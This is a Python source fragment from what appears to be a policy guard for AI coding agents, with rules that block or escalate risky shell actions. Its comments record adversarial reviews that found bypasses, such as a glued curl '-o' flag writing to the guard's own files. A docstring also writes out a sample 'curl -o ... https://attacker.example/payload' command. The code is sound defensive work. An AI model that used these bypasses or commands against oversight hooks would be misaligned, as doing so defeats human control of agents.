# is "any trusted command name inside any $PATH bin directory", a
# name+directory JOINT condition rather than one fixed path regex like
# every guard below -- folding it in here without real argument parsing
# risks a worse false-negative/false-positive trade than the disclosed gap
# is worth, so it stays a known, disclosed gap of this guard instead.
_FETCH_HUMAN_ESCAPABLE = (
    (patterns.MCP_CONFIG_PATH_RE, "an MCP server config"),
    (patterns.CI_WORKFLOW_PATH_RE, "a CI/CD pipeline definition"),
    (patterns.GIT_HOOKS_PATH_RE, "a git hook"),
    (patterns.AGENT_DEF_PATH_RE, "an agent/command/output-style definition"),
    (patterns.AGENT_INSTRUCTIONS_PATH_RE, "CLAUDE.md/AGENTS.md"),
    (patterns.CROSS_AGENT_INSTRUCTIONS_PATH_RE, "another AI coding agent's instructions file"),
    (patterns.SHELL_RC_PATH_RE, "a shell startup/profile file"),
    (patterns.SSH_PERSIST_PATH_RE, "an SSH persistence target"),
    (patterns.DIRENV_PATH_RE, "a direnv .envrc/direnvrc"),
    (patterns.PACKAGE_SCRIPTS_PATH_RE, "a package manifest (package.json/composer.json)"),
    (patterns.REGISTRY_CONFIG_PATH_RE, "a package-registry config"),
    (patterns.GIT_CONFIG_FILE_PATH_RE, "a git config file"),
    (patterns.GIT_ATTRS_PATH_RE, "a .gitattributes file"),
    (patterns.GITMODULES_PATH_RE, "a .gitmodules submodule config"),
    (patterns.SYSTEMD_UNIT_PATH_RE, "a systemd unit"),
    (patterns.LAUNCHD_PLIST_PATH_RE, "a launchd plist"),
    (patterns.LD_PRELOAD_PATH_RE, "the dynamic linker's preload list"),
    (patterns.LD_SO_CONF_PATH_RE, "the dynamic linker's search-path config"),
    (patterns.DEVCONTAINER_PATH_RE, "a dev-container config"),
    (patterns.VSCODE_TASKS_PATH_RE, "a VS Code auto-run task config"),
    (patterns.VSCODE_SETTINGS_PATH_RE, "VS Code's task auto-run confirmation gate"),
    (patterns.CLAUDE_LOCAL_SETTINGS_PATH_RE, "Claude Code's local hook config"),
    (patterns.CONFTEST_PATH_RE, "a pytest conftest.py"),
    (patterns.PYSITE_CUSTOMIZE_PATH_RE, "a Python interpreter-startup file"),
    (patterns.PYSITE_PTH_PATH_RE, "a site-packages .pth file"),
    (patterns.IPYTHON_STARTUP_PATH_RE, "an IPython/Jupyter startup file"),
)


def _fetch_to_file_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


# Most of the ~24 reused target-path regexes in _FETCH_NEVER_ESCAPABLE/
# _FETCH_HUMAN_ESCAPABLE require a real separator character immediately
# before the path (`(?:^|[\s'"/\\=])...`) -- the same boundary a normal,
# SPACED '-o <dest>' already provides. curl/wget's GLUED short-option form
# (`-o<dest>`, no space -- real, documented syntax, not obscure) instead
# leaves the path immediately adjacent to the flag's own trailing letter, a
# WORD character, so that boundary is never satisfied and ~20 of the 24
# reused regexes silently miss a glued destination even though
# FETCH_TO_FILE_VERB_RE itself correctly recognizes the verb (only the small
# minority of target regexes with no such boundary requirement at all --
# self-protect's own `CONFIG_DIR_RE`/`ENFORCEMENT_PATH_RE`/
# `AEGIS_SKILL_PATH_RE`, plus `GIT_HOOKS_PATH_RE`/`GIT_CONFIG_FILE_PATH_RE`/
# `SYSTEMD_UNIT_PATH_RE`/`LAUNCHD_PLIST_PATH_RE`/`PYSITE_PTH_PATH_RE` --
# happened to still match). QA finding (independent adversarial review,
# bypass-hunting round): reproduced against `AEGIS_SOURCE_RE` itself, part
# of the never-escapable tier (`curl -oaegis/rules.py <url>` sailed
# straight through). Rather than modifying 20 shared, already-tested target
# regexes (each one also relied on unchanged by its own sibling guard) to
# accept a boundary they were never designed to need, this normalizes just
# the SCAN TEXT fed to the target-path loops below: insert a synthetic
# space after a genuine glued `-o`/`-O`.
#
# QA finding (independent adversarial follow-up review, verifying this exact
# fix): a FIRST version here matched `-o`/`-O` context-free, with no
# requirement that it actually sit right after ITS OWN tool's name -- so
# once `FETCH_TO_FILE_VERB_RE` matched anywhere (e.g. one genuine, already-
# spaced `curl -o /tmp/out.bin ...`), the WHOLE command was rescanned, and
# an unrelated `-o`/`-O`-shaped substring sitting inert inside a quoted
# `--data` argument or a shell comment elsewhere in the same command -- not
# a real flag at all -- got a synthetic space inserted too, newly
# satisfying a majority-class target regex's boundary requirement it did
# NOT satisfy before this fix existed (verified: reproduced a fresh false
# ASK against `AGENT_INSTRUCTIONS_PATH_RE`/`CLAUDE.md` that did NOT occur
# on the pre-normalization code). Fixed by anchoring each candidate glued
# occurrence to its OWN tool mention the same way `FETCH_TO_FILE_VERB_RE`
# itself does (`\bcurl\b[^|;&\n]{0,200}?...`) -- but merely reusing that
# same `-o(?=\S)`-only shape here still leaked the identical bug: its lazy
# gap happily backtracks PAST a real, already-spaced `-o` (which never
# satisfies a bare `(?=\S)` lookahead) to reach a LATER, incidental
# glued-shaped substring within the same 200-char budget instead. The
# alternative here captures the actual destination-
# start token for BOTH the spaced (`\s+\S`) and glued (`\S`) shapes, so the
# engine commits to and consumes the FIRST real destination token after
# each tool mention (spaced ones are then a no-op), instead of skipping
# past it hunting for one that also happens to satisfy a bare `(?=\S)`
# lookahead. `finditer` then only reaches a SECOND occurrence when a
# SECOND, genuine tool mention exists later in the command (a real chained
# `curl ... && curl -o<dest2> ...`), never an incidental one with no tool
# mention of its own nearby.
_FETCH_DEST_TOKEN_RE = re.compile(
    r"\bcurl(?:\.exe)?\b[^|;&\n]{0,200}?(?:^|\s)-(?-i:o)(\s+\S|\S)"
    r"|\bwget\b[^|;&\n]{0,200}?(?:^|\s)-(?-i:O)(\s+\S|\S)",
    re.IGNORECASE,
)


def _fetch_normalize_glued_dest(cmd: str) -> str:
    out = []
    last = 0
    for m in _FETCH_DEST_TOKEN_RE.finditer(cmd):
        group_index = 1 if m.group(1) is not None else 2
        token = m.group(group_index)
        if token[0].isspace():
            continue  # already spaced -- no-op, a real boundary exists
        start = m.start(group_index)
        out.append(cmd[last:start])
        out.append(" ")
        last = start
    if not out:
        return cmd
    out.append(cmd[last:])
    return "".join(out)


def rule_fetch_to_file_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block a shell fetch tool (curl/wget/PowerShell Invoke-WebRequest/
    Start-BitsTransfer/certutil) writing its response DIRECTLY to a path
    every guard above already protects.

    THREAT MODEL: every ``*_protect`` guard in this file gates its shell
    branch on a fixed write-verb set -- a shell redirect, ``cp``/``install``/
    ``dd``, ``mv``/``rm``, ``sed -i``/``jq``+``sponge``, a forced symlink, an
    archive/sync tool -- paired with the guard's own protected-path check.
    None of those verb lists ever included a fetch tool's OWN destination
    flag: ``curl -o /path/to/target https://attacker.example/payload`` and
    ``wget -O /path/to/target https://...`` write a file exactly the way
    ``cp`` does, in one command, with the actual malicious content supplied
    entirely over the network rather than appearing anywhere in the command
    text itself -- arguably a STRONGER bypass than the other verbs (nothing
    in the tool call reveals what gets written, unlike a redirect's inline
    heredoc or an in-place edit's diff). This is not a theoretical gap:
    every sibling guard's own docstring in this file discloses it by name,
    from ``rule_mcp_config_protect`` through ``rule_ipython_startup_
    protect`` -- fifteen-plus guards sharing one unfixed hole. ``rule_self_
    protect`` (which carries no docstring of its own) has the identical
    hole, confirmed by reading its actual code rather than a disclosure:
    its shell branch's write-verb set (``DELETE_OR_MOVE_VERB_RE`` /
    ``DESTRUCTIVE_DELETE_RE`` / ``WRITE_REDIRECT_RE`` / ``COPY_WRITE_VERB_RE``
    / ``INPLACE_WRITE_RE``) has the identical hole for Aegis's OWN
    policy/config/source -- the one surface this whole file calls "not
    escapable."

    Rather than adding a sixth write-verb check to each of those guards
    individually (repeating the same fix N times, with N chances to miss
    one), this is a single new rule: it re-checks the fetch-to-file verb
    shape against EVERY already-protected surface in this file at once,
    reusing each guard's own path regex unchanged.

    Two tiers, matching each target's OWN guard's escapability exactly:

    - ``_FETCH_NEVER_ESCAPABLE`` (self-protect's own surfaces): DENY,
      unconditional, no ``mode`` knob, no override, no env toggle -- the
      same posture ``rule_self_protect`` itself holds for these files.
    - ``_FETCH_HUMAN_ESCAPABLE`` (every sibling ``*_protect`` guard's own
      path): ASK by default (``policy.fetch_to_file``: ``mode``
      deny|ask|monitor|off, ``allow`` regexes -- same shape every sibling
      guard's own config knob uses), escapable by a human only -- a
      trailing ``# aegis-allow``, or ``AEGIS_ALLOW_FETCH_TO_FILE=1`` set by
      the orchestrator/human before launch. A spawned agent cannot set its
      own env for a hook invocation it doesn't control and
      ``_override_allowed`` already refuses an agent's own ``#
      aegis-allow``, so neither path is agent-self-escapable, the same
      invariant every escapable guard in this file holds.

    Config (``policy.fetch_to_file``): ``mode`` (deny|ask|monitor|off,
    default ask) and ``allow`` govern ONLY the human-escapable tier above --
    the never-escapable tier has no config surface at all, deliberately,
    the same way ``rule_self_protect`` itself takes no policy config.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: ``FETCH_TO_FILE_VERB_RE`` requires curl's ``-o``/
    ``--output``/wget's ``-O``/``--output-document`` (or a PowerShell/
    certutil equivalent) name a literal destination argument in the
    scanned command -- curl's bare ``-O``/``--remote-name`` and wget's bare
    ``-P <dir>`` write using a filename taken from the URL itself, putting
    no literal destination PATH text in the command for the target-path
    check to match against, so those forms are covered only when combined
    with an explicit destination the target-path check can still see (see
    ``FETCH_TO_FILE_VERB_RE``'s own comment in ``patterns.py``); a
    destination assembled indirectly (shell variable concatenation, a
    wrapper script) rather than appearing as one contiguous literal defeats
    every check here, the same "computed indirectly" class every sibling
    guard already accepts; the PATH binary-shadow surface
    (``rule_path_hijack_protect``) is not covered at all (see
    ``_FETCH_HUMAN_ESCAPABLE``'s own comment for why); and, like every
    other whole-command boolean-AND guard in this file, an unrelated fetch
    call and an incidental protected-path mention sharing the same command
    (no real causal link between them) can produce a same-clause false ASK,
    the accepted trade-off this file's own module docstring and several
    sibling guards' docstrings already disclose for the identical shape --
    e.g. a genuine ``wget -O <realfile>`` paired with an UNRELATED ``-o
    <protected-looking-path>`` (wget's own, distinct log-file flag) in the
    same command still gates, since the target-path check has no per-flag
    adjacency awareness, only whole-command presence.

    QA history (two independent adversarial reviews, run in parallel, same
    convention every guard in this file follows): design/consistency review
    verified the wiring correct everywhere its siblings are (``_CORE_RULES``/
    ``BUILTIN_RULES``, ``Policy``, all three ``loader.py`` spots -- round-
    tripped an actual YAML ``fetch_to_file:`` block through ``load_policy()``
    into a live ``evaluate()`` decision for both ``mode`` and ``allow``,
    confirmed via ``aegis validate`` too -- both ``skills.py`` knob lists,
    the README guard table and Known-gaps paragraph), confirmed the
    never-escapable tier's four regexes match ``rule_self_protect``'s own
    checks exactly with no drift, confirmed the full suite green throughout,
    and recommended leaving the ~14 individual sibling-guard disclosures of
    this same gap as-is (each is still narrowly true about that guard's OWN
    write-verb checks; the aggregate picture belongs in README's cross-
    cutting paragraph, not fourteen edited docstrings). Bypass-hunting found
    and closed three real, reproduced bugs in ``FETCH_TO_FILE_VERB_RE``
    before merge -- a glued short-option (`-o.aegis/policy.yaml`, no space)
    silently bypassing even the never-escapable tier; a blanket
    ``re.IGNORECASE`` erasing curl's real, case-DISTINCT `-o`/`-O` and
    wget's `-o`/`-O` semantics, letting curl's deliberately-excluded bare
    `-O` false-positive and letting wget's unrelated `-o` log flag alone
    slip past a check meant for `-O`; and the identical unbounded-lazy-gap
    catastrophic-backtracking shape ``EXFIL_RE``'s own history already
    fixed once in this file, measured at 18.6s on an 82KB adversarial
    input, reachable through the real, timeout-free ``evaluate()`` pipeline
    -- see ``FETCH_TO_FILE_VERB_RE``'s own comment in ``patterns.py`` for
    all three fixes and the accepted residual gap (curl's clustered
    short-option form, `-sSLo <target>`) they leave open. Verifying the
    glued-option fix end-to-end (not just against the one example bypass-
    hunting tested) surfaced a fourth, broader issue in the same fix round:
    most of the ~24 reused target regexes require a real separator
    character immediately before the path (`(?:^|[\\s'"/\\\\=])...`), a
    boundary the glued flag's own trailing letter never supplies -- so the
    glued form stayed silently uncaught for the MAJORITY of targets,
    ``AEGIS_SOURCE_RE`` (never-escapable tier) included, even after the
    verb-regex fix. Closed with a first version of ``_fetch_normalize_
    glued_dest`` (below): rather than touching 20 shared, already-tested
    target regexes, it inserted the same synthetic space a spaced
    `-o <dest>` already has, on the occurrences a bare, context-free
    `-o`/`-O` regex found.

    A follow-up, independent adversarial round targeting THAT fix
    specifically (not re-litigating the earlier findings, verifying them
    instead) found and closed a fifth real, reproduced bug: the
    context-free `-o`/`-O` scan had no requirement that the match actually
    be a real flag of the invocation at all -- so once one genuine,
    already-spaced `-o /tmp/out.bin` satisfied the initial verb check, the
    WHOLE command got rescanned, and an unrelated `-o`/`-O`-shaped
    substring sitting inert inside a quoted `--data` argument or a shell
    comment elsewhere in the SAME command -- never a real flag -- also got
    a synthetic space inserted, newly satisfying a majority-class target
    regex's boundary requirement it did not satisfy before normalization
    existed at all (reproduced: a fresh false ASK against
    ``AGENT_INSTRUCTIONS_PATH_RE``/``CLAUDE.md`` with nothing ever written
    there, confirmed absent on the pre-normalization code by checking out
    the prior commit directly). A same-shaped repro against a
    never-escapable-tier target (``CONFIG_DIR_RE``/`.aegis`) turned out to
    be a RED HERRING on inspection -- that specific regex has no preceding-
    boundary requirement at all, so it already gated identically before any
    glued-destination fix existed; only the majority, boundary-requiring
    class was actually made worse. Closed by anchoring each candidate glued
    occurrence to its own tool mention, capturing the real destination-
    start token (spaced or glued) so the matcher commits to and consumes
    the FIRST genuine destination after each tool mention instead of
    backtracking past it to reach a later, incidental one -- a naive
    tool-anchored version using only a bare `(?=\\S)` lookahead (no spaced
    alternative to consume) was tried first and still leaked the identical
    bug, since its lazy gap happily skips past a real, already-spaced `-o`
    (which never satisfies a bare `(?=\\S)`) to reach the incidental one
    instead. See ``_fetch_normalize_glued_dest``'s own comment for the
    fix in full."""
    if not _is_shell(ev):
        return None
    cmd = _shell_scan(ev)
    if not patterns.FETCH_TO_FILE_VERB_RE.search(cmd):
        return None
    # Every target-path check below runs against the glue-normalized text
    # (see `_fetch_normalize_glued_dest`'s own comment) so a glued `-o<dest>`/
    # `-O<dest>` is seen with the same boundary a spaced form already has —
    # a no-op when the command has no glued short option at all.
    target_cmd = _fetch_normalize_glued_dest(cmd)

    for rx, label in _FETCH_NEVER_ESCAPABLE:
        if rx.search(target_cmd):
            return Decision(Action.DENY, "fetch-to-file-protect",
                             f"A fetch tool (curl/wget/...) is writing directly to {label} — "
                             "the same file(s) self-protection already refuses to let any "
                             "other write verb touch. Not escapable.")

    cfg = getattr(policy, "fetch_to_file", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    for rx, label in _FETCH_HUMAN_ESCAPABLE:
        if not rx.search(target_cmd):
            continue
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_FETCH_TO_FILE")
                or _fetch_to_file_allowed_by_policy(cfg, cmd)):
            return None
        decision = Decision(action, "fetch-to-file-protect",
                             f"A fetch tool (curl/wget/...) is writing directly to {label} "
                             "— this bypasses every write-verb check (redirect/copy/move/"
                             "in-place-edit/forced-link/archive-sync) the guard for that "
                             "surface already runs, since a fetch tool's own destination "
                             "flag was never on any of those lists. A human may append "
                             "'# aegis-allow', or set AEGIS_ALLOW_FETCH_TO_FILE=1; a "
                             "spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, decision, "fetch-to-file-protect-monitor")
            return None
        return decision
    return None


# ---- workspace confinement: opt-in, file-mutation tools ----------------------
def _within(path: str, root: str) -> bool:
    return path == root or path.startswith(root + os.sep)


def _confine_root(policy):
    """The project root the agent is confined to (file mutations must stay under
    it). Precedence: a VERIFIED token's `project` claim (identity binding) ->
    AEGIS_PROJECT -> policy.workspace.root -> AEGIS_WORKSPACE -> policy.project
    (.aegis default). None -> confinement is off."""
    cfg = getattr(policy, "workspace", None) or {}
    try:
        from . import identity
        claims = identity.current() or {}
    except Exception:
        claims = {}
    return (claims.get("project")
            or os.environ.get("AEGIS_PROJECT")
            or cfg.get("root")
            or os.environ.get("AEGIS_WORKSPACE")
            or getattr(policy, "project", None))


def rule_workspace_confine(ev: Event, policy=None) -> Optional[Decision]:
    """Hard-block file mutations (edit/write) outside the agent's project root.
    The root comes from the identity (token `project` claim / AEGIS_PROJECT) or
    policy (workspace.root / project). Non-escapable: an agent bound to a project
    cannot wander out of it. Reads are unaffected; full SHELL confinement is an OS
    concern (restricted user / container) - see README."""
    if ev.action not in (ActionClass.EDIT, ActionClass.WRITE):
        return None
    root = _confine_root(policy)
    if not root:
        return None
    target = _path(ev)
    if not target:
        return None
    cfg = getattr(policy, "workspace", None) or {}
    base = ev.cwd or os.getcwd()
    ap = os.path.abspath(os.path.join(base, os.path.expanduser(target)))
    roots = [os.path.abspath(os.path.expanduser(root))]
    roots += [os.path.abspath(os.path.expanduser(p)) for p in (cfg.get("allow") or [])]
    if any(_within(ap, r) for r in roots):
        return None
    return Decision(Action.DENY, "workspace-confine",
                    f"Out-of-project write blocked: {ap} is outside the agent's "
                    f"project root {roots[0]}. The identity is confined to its "
                    "project; widen it with workspace.allow or rebind the identity.")


# ---- sub-agent spawn governance: configurable ----------------------------------
def rule_subagent_spawn(ev: Event, policy=None) -> Optional[Decision]:
    """Block programmatic sub-agent fan-out (Agent/Task) for a SPAWNED agent —
    uncontrolled cost / blast radius. Humans/orchestrators may delegate. Override
    with AEGIS_ALLOW_SUBAGENTS=1 (or a declarative allow rule)."""
    if ev.action != ActionClass.SUBAGENT:
        return None
    if os.environ.get("AEGIS_ALLOW_SUBAGENTS"):
        return None
    if not os.environ.get("AEGIS_AGENT_NAME"):
        return None  # a human/orchestrator session may spawn
    return Decision(Action.DENY, "subagent-spawn",
                    "Spawned agents may not spawn sub-agents (Agent/Task) — programmatic "
                    "fan-out is uncontrolled cost/blast-radius. Do the work in this "
                    "session, or set AEGIS_ALLOW_SUBAGENTS=1.")


# ---- network egress governance: policy-driven --------------------------------
def rule_network_egress(ev: Event, policy=None) -> Optional[Decision]:
    """Govern where an agent may reach out. Reads ``policy.egress``:
    {default: allow|deny, allow: [host globs], deny: [host globs]}. No config -> no
    opinion. Covers net tools (url arg) and shell curl/Invoke-WebRequest URLs."""
    cfg = getattr(policy, "egress", None) or {}
    if not cfg:
        return None
    host = _egress_host(ev)
    if not host:
        return None
    deny = cfg.get("deny") or []
    allow = cfg.get("allow") or []
    default = str(cfg.get("default") or "allow").lower()
    if any(fnmatch.fnmatch(host, p) for p in deny):
        return Decision(Action.DENY, "egress", f"Network egress to '{host}' is blocked.")
    if allow and any(fnmatch.fnmatch(host, p) for p in allow):
        return None
    if default == "deny":
        return Decision(Action.DENY, "egress",
                        f"Network egress to '{host}' is not in the allowlist.")
    return None


# ---- migration / destructive-SQL: escapable with '# aegis-allow' / '-- aegis-allow'
def rule_migration_protection(ev: Event, policy=None) -> Optional[Decision]:
    """Block destructive DB ops / migration resets — across shell AND DB MCP tools
    (the tool args carry the SQL even when there is no shell)."""
    text = _sql_text(ev)
    if not text:
        return None
    if not (patterns.DESTRUCTIVE_SQL_RE.search(text)
            or patterns.DESTRUCTIVE_MIGRATION_RE.search(text)):
        return None
    if _override_allowed(ev, text):
        return None
    return Decision(Action.DENY, "destructive-migration",
                    "Destructive database/migration op (DROP / TRUNCATE / ALTER ... DROP "
                    "/ reset / downgrade, or DELETE/UPDATE without WHERE) is blocked. "
                    "Append '# aegis-allow' (or SQL '-- aegis-allow') to confirm intent.")


# ---- destructive git / delete: escapable with '# aegis-allow' ----------------
def rule_destructive_git(ev: Event, policy=None) -> Optional[Decision]:
    if not _is_shell(ev) or not patterns.DESTRUCTIVE_GIT_RE.search(_shell_scan(ev)):
        return None
    if _override_allowed(ev):
        return None
    return Decision(Action.DENY, "destructive-git",
                    "Destructive/history-rewriting git is blocked — append '# aegis-allow' "
                    "to confirm, or use a safe alternative (git revert, git branch -d).")


def rule_destructive_delete(ev: Event, policy=None) -> Optional[Decision]:
    if not _is_shell(ev) or not patterns.DESTRUCTIVE_DELETE_RE.search(_shell_scan(ev)):
        return None
    if _override_allowed(ev):
        return None
    return Decision(Action.DENY, "destructive-delete",
                    "Recursive force delete is blocked. Append '# aegis-allow' to confirm.")


# ---- evasion / obfuscation: deliberately hiding what you run -----------------
def rule_evasion(ev: Event, policy=None) -> Optional[Decision]:
    """Deny obfuscation tells (encoded commands, base64-decode piped to a shell,
    FromBase64String, char-code construction). Deliberately hiding a command from
    the guard IS the signal. Escapable only by a human."""
    if not _is_shell(ev):
        return None
    if not patterns.EVASION_RE.search(_cmd(ev)):
        return None
    if _override_allowed(ev):
        return None
    return Decision(Action.DENY, "evasion",
                    "Obfuscated/encoded command blocked — run it in the clear so the "
                    "policy can see it (encoded commands, base64-piped-to-shell, and "
                    "char-code construction are how guards get bypassed).")


# ---- forced install review: read-before-install, then human ask --------------
def rule_install_review(ev: Event, policy=None) -> Optional[Decision]:
    """Force a full read of an install's manifest, then a human ask.

    A careless agent runs ``pip install -r requirements.txt`` straight from a repo's
    setup notes and never looks at what it pulls in. This gate closes that path:

    1. **Deny until read** — any install whose manifest (``requirements.txt``,
       ``package.json`` + lock, ``pyproject.toml``/``poetry.lock``, …; plus the
       *local* install-time scripts in ``deep`` mode) hasn't been **fully read** this
       session is refused. A skim — a ``Read`` that stops short, or a ``grep``/``head``
       peek — never satisfies coverage (see ``aegis.review``).
    2. **Then ask** — once coverage is satisfied, the install is surfaced to the human
       with a factual digest (dep count, unpinned specs, URL/VCS deps, install
       scripts) instead of running silently.

    Honest scope: this gates the *manifest* and forces a human decision. It does NOT
    inspect a dependency's install-time code (that runs inside the package manager's
    subprocess, below the hook boundary), so it does not by itself stop a clean-repo /
    error-driven attack whose payload is in package code or a later step. ``deep`` mode
    force-reads the *local* setup.py/postinstall (catching a malicious ``pip install
    .``), not a downloaded third-party package's. Pair with egress + OS isolation.

    Config (``policy.install_review``): ``mode`` (off|monitor|ask, default ask;
    monitor logs the would-be decision to the audit and allows), ``deep``,
    ``require_pinned`` (deny unpinned specs), ``allow`` (regex exemptions on the raw
    command). The read-gate is non-escapable by a spawned agent (it cannot
    ``# aegis-allow`` itself); a human may override. No-execute fetches
    (``pip download``, ``npm pack``) and ``AEGIS_ALLOW_INSTALL=1`` bypass the gate.
    Coverage requires the runtime to deliver Read content at PostToolUse (Claude Code
    does); a runtime that doesn't will fail closed — use a human override or monitor."""
    if not _is_shell(ev):
        return None
    text = _shell_scan(ev)
    if not patterns.INSTALL_ANY_RE.search(text):
        return None
    if patterns.NOEXEC_FETCH_RE.search(text):
        return None  # a no-execute fetch (download/pack) is not an install
    if os.environ.get("AEGIS_ALLOW_INSTALL"):
        return None
    cfg = getattr(policy, "install_review", None) or {}
    mode = str(cfg.get("mode", "ask")).lower()
    if mode == "off":
        return None
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), _cmd(ev), re.IGNORECASE):
                return None
        except re.error:
            continue

    cwd = ev.cwd or os.getcwd()
    deep = bool(cfg.get("deep"))
    # Detection runs on the de-obfuscated surface (catches wrapped installs); manifest
    # / package resolution runs on the RAW command — the scan surface duplicates tokens,
    # which would corrupt package-name and path parsing.
    raw_cmd = _cmd(ev)
    manifests = review.resolve_manifests(raw_cmd, cwd, deep=deep)
    session = ev.session_id or os.environ.get("AEGIS_SESSION_ID")
    unread = [m for m in manifests if not review.is_fully_read(session, m, cwd)]
    if _override_allowed(ev):  # human override (a spawned agent can't reach this)
        return None

    # The decision this gate WOULD make (None -> nothing to do / allow).
    would: Optional[Decision] = None
    if unread:
        names = ", ".join(os.path.basename(m) for m in unread)
        what = "install-time script(s)/manifest(s)" if deep else "manifest(s)"
        would = Decision(Action.DENY, "install-review",
                         f"Install blocked — forced dependency review: {names} not fully "
                         f"read this session. Read the entire {what} in full (no "
                         f"limit/offset, no grep/head/tail) so the dependency list is "
                         f"actually in context, then retry. A human may append "
                         f"'# aegis-allow'; a spawned agent cannot.")
    else:
        d = review.digest(manifests, raw_cmd, cwd)
        if cfg.get("require_pinned") and d.get("unpinned"):
            would = Decision(Action.DENY, "install-review",
                             f"Install blocked — {d['unpinned']} unpinned dependency "
                             f"spec(s); the installed set must be pinned (exact '==' / a "
                             f"lockfile) to be reviewable. Pin the versions, or append "
                             f"'# aegis-allow' (human only). [{review.format_digest(d)}]")
        else:
            would = Decision(Action.ASK, "install-review",
                             f"Dependency install — review the dependency list before "
                             f"approving: {review.format_digest(d)}. (The manifest is "
                             f"reviewed; package install-time code is not — see docs.)")

    if mode == "monitor":
        _record_monitor(ev, would)
        return None
    return would


def _record_monitor(ev: Event, would: Decision, rule_note: str = "install-review-monitor") -> None:
    """Monitor mode: record the would-be decision to the audit (so a pilot can measure
    projected denials with `aegis report`) without blocking. Best-effort."""
    try:
        from . import config
        from .audit import write_event
        note = Decision(would.action, rule_note,
                        f"[monitor] would {would.action.value}: {would.message}")
        write_event(ev, note, str(config.audit_path()))
    except Exception:
        pass


# ---- failure-loop: an identical retry of a call that keeps failing -----------
def rule_failure_loop(ev: Event, policy=None) -> Optional[Decision]:
    """Deny the Nth identical retry of a tool call that already failed N times
    this session — the agent-thrash loop. The enforcement point is PreToolUse
    (blockable); the evidence comes from the ``aegis.failures`` ledger, fed by
    PostToolUseFailure (observational). Only an *identical* call (same tool,
    same args — see ``failures.signature``) counts: the deny reason tells the
    model to change approach, and any change starts a fresh signature. A later
    success of the same signature clears its streak.

    Config (``policy.failures``): ``mode`` (deny|ask|monitor|off, default deny),
    ``max_repeats`` (default 3). Escapable by a human only: '# aegis-allow' on a
    shell command, or AEGIS_ALLOW_RETRY=1 set by the orchestrator."""
    if ev.event != HookEvent.PRE_TOOL_USE:
        return None
    cfg = getattr(policy, "failures", None) or {}
    mode = str(cfg.get("mode", "deny")).lower()
    # YAML 1.1 parses an unquoted `off` as boolean False — accept both spellings.
    if mode in ("off", "false") or cfg.get("mode") is False:
        return None
    if os.environ.get("AEGIS_ALLOW_RETRY"):
        return None
    try:
        limit = max(1, int(cfg.get("max_repeats", 3)))
    except (TypeError, ValueError):
        limit = 3
    from . import failures
    session = ev.session_id or os.environ.get("AEGIS_SESSION_ID")
    n = failures.failure_count(session, failures.signature(ev.tool, ev.args))
    if n < limit:
        return None
    if _override_allowed(ev):
        return None
    action = Action.ASK if mode == "ask" else Action.DENY
    would = Decision(action, "failure-loop",
                     f"This exact {ev.tool or 'tool'} call already failed {n} "
                     "time(s) this session — an identical retry is a thrash loop, "
                     "not progress. Read the error, fix the cause or change the "
                     "arguments/approach, then proceed. A human may append "
                     "'# aegis-allow' or set AEGIS_ALLOW_RETRY=1.")
    if mode == "monitor":
        _record_monitor(ev, would, "failure-loop-monitor")
        return None
    return would


# ---- fetch-and-execute / DNS-C2: remote code an agent never read -------------
def rule_remote_exec(ev: Event, policy=None) -> Optional[Decision]:
    """Deny piping a network fetch straight into a shell (``curl … | sh``) and DNS-TXT
    command/payload retrieval — remote code (or a DNS-delivered payload) that was
    never read. This catches the common single-command *shape*; it is not exhaustive
    — fetch-to-temp-then-exec as two statements, or an in-process resolver/HTTP call
    inside an interpreted program, won't surface here (deny-by-default egress is the
    backstop for those). Human-escapable like evasion; a spawned agent cannot."""
    if not _is_shell(ev):
        return None
    text = _shell_scan(ev)
    if not (patterns.PIPE_TO_SHELL_RE.search(text) or patterns.DNS_C2_RE.search(text)):
        return None
    if _override_allowed(ev):
        return None
    return Decision(Action.DENY, "remote-exec",
                    "Fetch-piped-to-shell / DNS-TXT command retrieval is blocked — this "
                    "runs remote code (or a DNS-delivered payload) that was never read. "
                    "Download it, read it in full, then run the local copy. A human may "
                    "append '# aegis-allow'.")


# ---- branch strands: work-loss prevention, escapable ------------------------
def _git_out(cwd, *args) -> str:
    """Run a read-only git command; return stdout or empty. Windowless, time-bounded,
    fail-safe (any error -> '')."""
    try:
        flags = 0x08000000 if os.name == "nt" else 0
        r = subprocess.run(["git", "-C", str(cwd or "."), *args],
                           capture_output=True, text=True, timeout=5,
                           creationflags=flags)
        return (r.stdout or "").strip() if r.returncode == 0 else ""
    except Exception:
        return ""


def _commits_ahead(cwd) -> tuple:
    """(current_branch, n_commits_ahead_of_main). Returns (None, 0) on uncertainty
    so the guard fails OPEN."""
    try:
        cur = _git_out(cwd, "rev-parse", "--abbrev-ref", "HEAD")
        if not cur or cur == "HEAD":
            return (None, 0)
        base = None
        for b in ("main", "master"):
            if _git_out(cwd, "rev-parse", "--verify", "--quiet", b):
                base = b
                break
        if not base or cur == base:
            return (cur, 0)
        n = _git_out(cwd, "rev-list", "--count", f"{base}..HEAD")
        return (cur, int(n) if (n and n.isdigit()) else 0)
    except Exception:
        return (None, 0)


def rule_branch_strands(ev: Event, policy=None) -> Optional[Decision]:
    """Don't create a new branch while the current one has commits not in main —
    that strands the old work. Covers shell ``git checkout -b`` / ``git switch -c``.
    Escapable with ``# aegis-allow`` or ``AEGIS_ALLOW_STRAND=1``. Fail-OPEN."""
    if not _is_shell(ev):
        return None
    if os.environ.get("AEGIS_ALLOW_STRAND"):
        return None
    text = _shell_scan(ev)
    if not patterns.NEW_BRANCH_RE.search(text):
        return None
    if _override_allowed(ev):
        return None
    cwd = ev.cwd or os.getcwd()
    cur, ahead = _commits_ahead(cwd)
    if ahead <= 0:
        return None
    return Decision(Action.DENY, "branch-strand",
                    f"Branch '{cur}' has {ahead} commit(s) not in main. Creating a new "
                    "branch now strands that work. Merge/push/PR the current branch "
                    "first, then create the new one. Append '# aegis-allow' to override, "
                    "or set AEGIS_ALLOW_STRAND=1.")


def _lifecycle_rules() -> tuple:
    """Pull in the lifecycle-hook rules (ConfigChange / SubagentStart / PreCompact /
